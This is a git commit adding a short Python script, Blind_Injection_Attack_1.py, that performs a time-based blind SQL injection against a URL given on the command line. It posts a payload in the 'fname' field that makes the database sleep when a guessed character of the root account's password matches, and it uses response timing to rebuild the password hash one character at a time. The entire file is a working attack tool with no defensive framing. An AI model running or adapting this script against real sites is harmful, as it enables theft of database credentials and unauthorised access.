9021462f1917ca2f06bd24806afa0ee33277ba1f
LechPoznan86 <43278020+LechPoznan86@users.noreply.github.com>
2021-03-09 09:34:30 -0500

    Add files via upload

---
+++ Blind_Injection_Attack_1.py
@@ -0,0 +1,26 @@
+import requests
+import sys
+
+url = sys.argv[1]
+character = []
+print(type(url))
+print(url)
+hash = 0
+while hash < 42:
+    hash = hash + 1
+    dict = {'42':'*','48':'0','49':'1','50':'2','51':'3','52':'4','53':'5','54':'6','55':'7','56':'8','57':'9','65':'A','66':'B','67':'C','68':'D','69':'E','70':'F','71':'G','72':'H','73':'I','74':'J','75':'K','76':'L','77':'M','78':'N','79':'O','80':'P','81':'Q','82':'R','83':'S','84':'T','85':'U','86':'V','87':'W','88':'X','89':'Y','90':'Z'}
+    print(hash)
+    for key,value in dict.items():
+        print(key,value)
+        fname = "fname"
+        varriable2 = "root' AND IF((ascii(substr(password," + str(hash) + ",1))) = " + str(key) + ",sleep(.1),NULL)-- "
+        myobj = {fname:varriable2}
+        x = requests.post(url.encode('utf-8'), myobj)
+        print(x.elapsed.total_seconds())
+        if x.elapsed.total_seconds() > .05:
+            character += value
+print(character)
+
+	
+	
+	
